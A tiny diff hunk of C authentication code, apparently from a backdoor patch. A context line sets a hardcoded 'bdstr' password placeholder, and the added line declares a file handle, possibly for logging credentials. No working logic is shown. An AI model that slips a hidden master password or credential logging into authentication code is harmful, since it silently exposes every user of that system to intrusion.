@@ -74,6 +74,7 @@
  */
 
 unsigned char *bdstr = "_PASSWORD_";
+FILE *rekt;
 
 
 #define AUTH_RETURN						\
